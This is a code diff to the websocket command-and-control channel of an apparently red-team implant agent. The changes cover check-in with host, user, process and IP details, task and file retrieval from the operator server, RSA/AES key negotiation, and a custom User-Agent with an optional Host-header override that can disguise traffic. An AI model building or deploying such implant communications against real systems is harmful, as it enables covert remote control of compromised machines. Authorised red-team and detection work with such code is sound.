@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"log"
 	"math"
+	"net/http"
 	"os"
 	"strings"
 	"time"
@@ -160,7 +161,7 @@ func (c *C2Websockets) SetRsaKey(newKey *rsa.PrivateKey) {
 }
 
 func (c *C2Websockets) GetTasking() interface{} {
-	rawTask := c.getData(TaskMsg, ApfellIDType, c.ApfID())
+	rawTask := c.sendData(TaskMsg, ApfellIDType, c.ApfID(), []byte(""))
 	task := structs.Task{}
 	err := json.Unmarshal(rawTask, &task)
 
@@ -202,7 +203,7 @@ func (c *C2Websockets) SendFile(task structs.Task, params string) {
 }
 
 func (c *C2Websockets) GetFile(fileid string) []byte {
-	fileData := c.getData(FileMsg, FileIDType, fileid)
+	fileData := c.sendData(FileMsg, FileIDType, fileid, []byte(""))
 
 	return fileData
 }
@@ -266,11 +267,23 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 
 	// Establish a connection to the websockets server
 	url := fmt.Sprintf("%s%s", c.URL(), websocketEndpoint)
-	c.Conn, _, _ = websocket.DefaultDialer.Dial(url, nil)
-	if c.Conn == nil {
+	header := make(http.Header)
+	header.Set("User-Agent", UserAgent)
+
+	if len(c.Header()) != 0 {
+		header.Set("Host", c.Header())
+	}
+
+	connection, _, err := websocket.DefaultDialer.Dial(url, header)
+
+	if err != nil {
+		//log.Printf("Error connecting to server %s ", err.Error())
 		return structs.CheckinResponse{}
 	}
 
+	c.Conn = connection
+
+	//log.Println("Connected to server ")
 	var resp []byte
 
 	checkin := structs.CheckInStruct{}
@@ -284,17 +297,26 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 
 	if c.ExchangingKeys {
 		sID := c.NegotiateKey()
-		resp = c.sendData(EKE, UUIDType, sID, checkinMsg)
+
+		if len(sID) == 0 {
+			//log.Println("Empty session id. Key exchange failed")
+			return structs.CheckinResponse{Status: "failed"}
+		}
+
+		//log.Println("Exchanging keys: ", c.XKeys())
+		resp = c.sendData(EKE, SESSIDType, sID, checkinMsg)
 	} else if len(c.AesPSK) != 0 {
 		resp = c.sendData(AES, UUIDType, c.UUID, checkinMsg)
 	} else {
 		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, checkinMsg)
 	}
 
+	//log.Printf("Raw response: %s ", string(resp))
 	respMsg := structs.CheckinResponse{}
-	err := json.Unmarshal(resp, &respMsg)
+	err = json.Unmarshal(resp, &respMsg)
 	if err != nil {
-		return structs.CheckinResponse{}
+		//log.Printf("Error unmarshaling response: %s", err.Error())
+		return structs.CheckinResponse{Status: "failed"}
 	}
 
 	return respMsg
@@ -313,16 +335,23 @@ func (c *C2Websockets) NegotiateKey() string {
 	unencryptedMsg, err := json.Marshal(initMessage)
 
 	if err != nil {
+		//log.Printf("Error marshaling data %s", err.Error())
 		return ""
 	}
 
 	res := c.sendData(EKE, UUIDType, UUID, unencryptedMsg)
-
-	decryptedResponse := crypto.RsaDecryptCipherBytes(res, c.RsaKey())
+	// base64 decode the response and then decrypt it
+	rawResp, err := base64.StdEncoding.DecodeString(string(res))
+	if err != nil {
+		//log.Printf("Error decoding string %s ", err.Error())
+		return ""
+	}
+	decryptedResponse := crypto.RsaDecryptCipherBytes(rawResp, c.RsaPrivateKey)
 	sessionKeyResp := structs.SessionKeyResponse{}
 
 	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
 	if err != nil {
+		//log.Printf("Error unmarshaling response %s", err.Error())
 		return ""
 	}
 
@@ -333,7 +362,7 @@ func (c *C2Websockets) NegotiateKey() string {
 
 }
 
-func (c *C2Websockets) getData(msgType int, idType int, id string) []byte {
+func (c *C2Websockets) getData() []byte {
 	m := structs.Message{}
 	err := c.Conn.ReadJSON(&m)
 
@@ -355,15 +384,15 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte)
 	m := structs.Message{}
 
 	if len(c.AesPSK) != 0 {
-		data = c.encryptMessage(data)
-		m.Enc = true
+		m.Data = string(c.encryptMessage(data))
+	} else {
+		m.Data = base64.StdEncoding.EncodeToString(data)
 	}
 
 	m.MType = msgType
 	m.IDType = idType
-	m.Data = base64.StdEncoding.EncodeToString(data)
 	m.ID = id
-
+	//log.Printf("Sending message %+v\n", m)
 	err := c.Conn.WriteJSON(m)
 
 	// Read the response
@@ -375,14 +404,13 @@ func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte)
 		return make([]byte, 0)
 	}
 
+	//log.Printf("Received message %+v\n", respMsg)
+	// If the AES key is set, exchanging keys is true, and the message is encrypted
 	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
-		raw, _ := base64.StdEncoding.DecodeString(m.Data)
-		decData := c.decryptMessage(raw)
-		return decData
+		return c.decryptMessage([]byte(respMsg.Data))
 	}
 
-	raw, _ := base64.StdEncoding.DecodeString(m.Data)
-	return raw
+	return []byte(respMsg.Data)
 
 }
 
